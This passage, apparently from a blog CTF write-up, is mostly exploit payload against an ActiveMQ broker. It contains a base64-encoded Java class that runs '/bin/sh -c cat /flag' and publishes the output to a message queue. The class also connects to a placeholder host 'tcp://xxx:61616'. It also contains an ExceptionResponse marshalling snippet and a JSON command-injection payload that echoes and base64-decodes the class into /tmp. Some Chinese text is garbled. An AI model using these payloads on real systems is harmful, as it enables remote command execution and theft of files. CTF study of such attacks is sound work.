hZMnROWVhCVVlXSnNaUUVBQ2xOdmRYSmpaVVpwYkdVQkFBbE5ZV2x1TG1waGRtRU1BRE1BTkFFQUxXOXlaeTloY0dGamFHVXZZV04wYVhabGJYRXZRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVRRUFGWFJqY0Rvdkx6RXlOeTR3TGpBdU1UbzJNVFl4Tmd3QU13Q1VCd0NWREFDV0FKY0JBQkZxWVhaaGVDOXFiWE12VTJWemMybHZiZ2NBbUF3QW1RQ2FBUUFKWm14aFozRjFaWFZsREFDYkFKd01BSjBBbmdFQUVHcGhkbUV2YkdGdVp5OVRkSEpwYm1jQkFBY3ZZbWx1TDNOb0FRQUNMV01CQUFsallYUWdMMlpzWVdjQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnRUFHR3BoZG1FdmJHRnVaeTlRY205alpYTnpRblZwYkdSbGNnd0FNd0JUREFDZkFLQUhBS0VNQUtJQW93d0FNd0NrQVFBQ1hFRU1BS1VBcGd3QXB3Q29EQUNwQUtvTUFETUFxd3dBckFDdERBQ3VBSlFIQUs4TUFMQUFWZ2NBc1F3QXNnQ3pBUUFRY0hWaWJHbHphQ0JtYVc1cGMyaGxaQWNBdEF3QXRRQ1VEQUMyQURRQkFBOTBZM0E2THk5NGVIZzZOakUyTVRZTUFMY0F1QWNBdVF3QXVnQzdEQUNmQURRQkFBUk5ZV2x1REFBNkFEUUJBQmRxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNnRUFDVkpsWTJWcGRtVmtJQXdBdkFDOUFRQVZhbUYyWVhndmFtMXpMMVJsZUhSTlpYTnpZV2RsREFDK0FLZ01BTDhBcUFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNE1BTUFBTkFFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCbHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpVeHBjM1JsYm1WeUFRQVZLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBYmFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNUdZV04wYjNKNUFRQVFZM0psWVhSbFEyOXVibVZqZEdsdmJnRUFHQ2dwVEdwaGRtRjRMMnB0Y3k5RGIyNXVaV04wYVc5dU93RUFGR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1QVFBTlkzSmxZWFJsVTJWemMybHZiZ0VBRnloYVNTbE1hbUYyWVhndmFtMXpMMU5sYzNOcGIyNDdBUUFMWTNKbFlYUmxVWFZsZFdVQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaGVDOXFiWE12VVhWbGRXVTdBUUFPWTNKbFlYUmxVSEp2WkhWalpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFGYzNSaGNuUUJBQlVvS1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3pzQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFEbWRsZEVsdWNIVjBVM1J5WldGdEFRQVhLQ2xNYW1GMllTOXBieTlKYm5CMWRGTjBjbVZoYlRzQkFCZ29UR3BoZG1FdmFXOHZTVzV3ZFhSVGRISmxZVzA3S1ZZQkFBeDFjMlZFWld4cGJXbDBaWElCQUNjb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDNWMGFXd3ZVMk5oYm01bGNqc0JBQVJ1WlhoMEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFoblpYUkNlWFJsY3dFQUJDZ3BXMElCQUFVb1cwSXBWZ0VBRVdOeVpXRjBaVlJsZUhSTlpYTnpZV2RsQVFBWktDbE1hbUYyWVhndmFtMXpMMVJsZUhSTlpYTnpZV2RsT3dFQUIzTmxkRlJsZUhRQkFCbHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpWQnliMlIxWTJWeUFRQUVjMlZ1WkFFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBTnZkWFFCQUJWTWFtRjJZUzlwYnk5UWNtbHVkRk4wY21WaGJUc0JBQk5xWVhaaEwybHZMMUJ5YVc1MFUzUnlaV0Z0QVFBSGNISnBiblJzYmdFQUJXTnNiM05sQVFBT1kzSmxZWFJsUTI5dWMzVnRaWElCQURRb1RHcGhkbUY0TDJwdGN5OUVaWE4wYVc1aGRHbHZianNwVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsUTI5dWMzVnRaWEk3QVFBWmFtRjJZWGd2YW0xekwwMWxjM05oWjJWRGIyNXpkVzFsY2dFQUVuTmxkRTFsYzNOaFoyVk1hWE4wWlc1bGNnRUFIaWhNYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZNYVhOMFpXNWxjanNwVmdFQUJtRndjR1Z1WkFFQUxTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtZENkV2xzWkdWeU93RUFCMmRsZEZSbGVIUUJBQWgwYjFOMGNtbHVad0VBRDNCeWFXNTBVM1JoWTJ0VWNtRmpaUUFoQUNVQU1RQUJBRElBQUFBRkFBRUFNd0EwQUFFQU5RQUFBQzhBQVFBQkFBQUFCU3EzQUFHeEFBQUFBZ0EyQUFBQUJnQUJBQUFBQlFBM0FBQUFEQUFCQUFBQUJRQTRBRGtBQUFBQ0FEb0FOQUFDQURVQUFBRmVBQVVBQ2dBQUFKcTdBQUpaRWdPM0FBUk1LN2tBQlFFQVRTd0RCTGtBQndNQVRpMFNDTGtBQ1FJQU9nUXRHUVM1QUFvQ0FEb0ZCcjBBQzFrREVneFRXUVFTRFZOWkJSSU9Vem9HdXdBUFdic0FFRmtaQnJjQUViWUFFcllBRTdjQUZCSVZ0Z0FXdGdBWHRnQVlPZ2U3QUF0WkdRZTNBQms2Q0MyNUFCb0JBRG9KR1FrWkNMa0FHd0lBR1FVWkNia0FIQUlBc2dBZEVoNjJBQjhzdVFBZ0FRQ3hBQUFBQWdBMkFBQUFSZ0FSQUFBQUNBQUtBQWtBRVFBS0FCb0FDd0FrQUF3QUxnQU5BRU1BRGdCYkFBOEFYZ0FRQUdFQUVRQm1BQklBY1FBVEFIa0FGQUNDQUJVQWl3QVdBSk1BRndDWkFCZ0FOd0FBQUdZQUNnQUFBSm9BT0FBNUFBQUFDZ0NRQURzQVBBQUJBQkVBaVFBOUFENEFBZ0FhQUlBQVB3QkFBQU1BSkFCMkFFRUFRZ0FFQUM0QWJBQkRBRVFBQlFCREFGY0FSUUJHQUFZQVpnQTBBRWNBU0FBSEFIRUFLUUJKQUVvQUNBQjVBQ0VBU3dCTUFBa0FUUUFBQUFRQUFRQXZBQUlBVGdBMEFBSUFOUUFBQUxVQUF3QUdBQUFBUGJzQUFsa1NJYmNBQkV3cnVRQUZBUUJOTEFNRXVRQUhBd0JPTFJJSXVRQUpBZ0E2QkMwWkJMa0FJZ0lBT2dVWkJTcTVBQ01DQUN5NUFDUUJBTEVBQUFBQ0FEWUFBQUFpQUFnQUFBQWJBQW9BSEFBUkFCMEFHZ0FlQUNRQUh3QXVBQ0FBTmdBaEFEd0FJZ0EzQUFBQVBnQUdBQUFBUFFBNEFEa0FBQUFLQURNQU93QThBQUVBRVFBc0FEMEFQZ0FDQUJvQUl3QlBBRUFBQXdBa0FCa0FRUUJDQUFRQUxnQVBBRkFBVVFBRkFFMEFBQUFFQUFFQUx3QUpBRklBVXdBQ0FEVUFBQUJKQUFJQUFnQUFBQTI3QUNWWnR3QW1UQ3UzQUNleEFBQUFBZ0EyQUFBQURnQURBQUFBSmdBSUFDY0FEQUFvQURjQUFBQVdBQUlBQUFBTkFGUUFSZ0FBQUFnQUJRQlNBRGtBQVFCTkFBQUFCQUFCQUM4QUFRQlZBRllBQVFBMUFBQUFqUUFEQUFNQUFBQXFzZ0FkdXdBb1diY0FLUklxdGdBcks4QUFMTGtBTFFFQXRnQXJ0Z0F1dGdBZnB3QUlUU3kyQURDeEFBRUFBQUFoQUNRQUx3QURBRFlBQUFBV0FBVUFBQUF0QUNFQU1BQWtBQzRBSlFBdkFDa0FNUUEzQUFBQUlBQURBQ1VBQkFCWEFGZ0FBZ0FBQUNvQU9BQTVBQUFBQUFBcUFFa0FXUUFCQUZvQUFBQUhBQUprQndBdkJBQUJBRnNBQUFBQ0FGdz0iXX0=&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">   <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ç¼–è¯‘å¥½çš„classçš„base64 &gt; /tmp/nmlgb.txt</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;cmd&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;</span>,<span class="string">&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgv